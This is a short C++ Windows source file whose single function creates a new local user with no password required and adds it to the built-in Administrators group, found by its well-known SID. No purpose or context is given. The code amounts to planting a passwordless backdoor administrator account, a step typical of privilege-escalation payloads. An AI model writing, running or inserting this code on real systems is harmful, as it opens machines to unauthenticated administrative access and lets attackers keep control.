#include "stdafx.h"

bool create_user(wchar_t* username)
{
	//create the user info structure
	USER_INFO_1 user_info = { 0 };
	user_info.usri1_name = (LPWSTR)username;
	user_info.usri1_password = NULL;
	user_info.usri1_priv = USER_PRIV_USER;
	user_info.usri1_home_dir = NULL;
	user_info.usri1_comment = NULL;
	user_info.usri1_flags = UF_SCRIPT | UF_PASSWD_NOTREQD;
	user_info.usri1_script_path = NULL;

	//add user
	DWORD error = 0;
	auto status = NetUserAdd(NULL, 1, (LPBYTE)&user_info, &error);
	if (status != NERR_Success)
	{
		switch (status)
		{
		case ERROR_INVALID_PARAMETER:
			break;
		case ERROR_ACCESS_DENIED:
			break;
		case NERR_InvalidComputer:
			break;
		case NERR_NotPrimary:
			break;
		case NERR_GroupExists:
			break;
		case NERR_UserExists:
			break;
		case NERR_PasswordTooShort:
			break;
		default:
			break;
		}

		return false;
	}

	//we need to find the administrator group name
	PSID admin_groupe_sid;
	if (!ConvertStringSidToSidA("S-1-5-32-544", &admin_groupe_sid))
	{
		// unable to convert group SID
		return false;
	}

	// find the admin user group string
	const auto buffer_size = 256;
	wchar_t admin_user_group_name[buffer_size];
	DWORD admin_user_group_name_size = buffer_size;
	wchar_t domain_name[buffer_size];
	DWORD domain_name_size = buffer_size;
	SID_NAME_USE sid_type = SidTypeGroup;

	// we call as wide char so we don't have to convert later
	if (!LookupAccountSidW(NULL, admin_groupe_sid, admin_user_group_name, &admin_user_group_name_size, domain_name, &domain_name_size, &sid_type))
	{
		// unable to get account SID for admin
		LocalFree(admin_groupe_sid);
		return false;
	}

	//free sid buffer
	LocalFree(admin_groupe_sid);

	//create local group info structure
	LOCALGROUP_MEMBERS_INFO_3 lm_info = { 0 };
	lm_info.lgrmi3_domainandname = (LPWSTR)username;

	//add user to admin group
	status = NetLocalGroupAddMembers(NULL, admin_user_group_name, 3, (LPBYTE)&lm_info, 1);
	if (NERR_Success != status)
	{
		// unable to add user to user group
		return false;
	}

	//ok
	return true;
}
